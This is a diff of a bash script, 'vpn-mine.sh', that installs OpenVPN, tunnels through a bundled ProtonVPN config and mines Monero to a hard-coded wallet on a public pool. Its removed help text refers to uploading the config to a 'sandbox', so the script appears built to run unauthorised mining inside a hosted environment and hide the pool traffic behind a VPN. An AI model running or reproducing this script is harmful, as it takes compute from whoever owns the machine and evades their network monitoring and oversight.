@@ -1,14 +1,14 @@
 #!/bin/bash
-# vpn-mine.sh - Mine using ProtonVPN or any OpenVPN config
-# Usage: bash vpn-mine.sh [path-to-ovpn-config]
+# vpn-mine.sh - Mine using ProtonVPN
+# Usage: bash vpn-mine.sh
 
 WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
 POOL_URL="pool.supportxmr.com:443"
-OVPN_CONFIG="${1:-/root/proton.ovpn}"  # Default to /root/proton.ovpn
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
 
 set -e
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+OVPN_CONFIG="$SCRIPT_DIR/us-free-59.protonvpn.udp.ovpn"
 
 # Install dependencies
 echo "Installing OpenVPN..."
@@ -27,19 +27,14 @@ fi
 # Check if VPN config exists
 if [ ! -f "$OVPN_CONFIG" ]; then
   echo "ERROR: VPN config not found at $OVPN_CONFIG"
-  echo ""
-  echo "To use ProtonVPN:"
-  echo "1. Sign up: https://account.protonvpn.com/signup"
-  echo "2. Download config: https://account.protonvpn.com/downloads"
-  echo "3. Upload .ovpn file to sandbox and run:"
-  echo "   bash vpn-mine.sh /path/to/config.ovpn"
   exit 1
 fi
 
 # Start VPN in background
-echo "Connecting to VPN..."
-nohup openvpn --config "$OVPN_CONFIG" --daemon > /tmp/vpn.log 2>&1 &
-sleep 10
+echo "Connecting to ProtonVPN..."
+cd "$SCRIPT_DIR"  # Important: auth file is relative to .ovpn location
+nohup openvpn --config "$OVPN_CONFIG" > /tmp/vpn.log 2>&1 &
+sleep 15
 
 # Check if connected
 if ! ip a show tun0 >/dev/null 2>&1; then
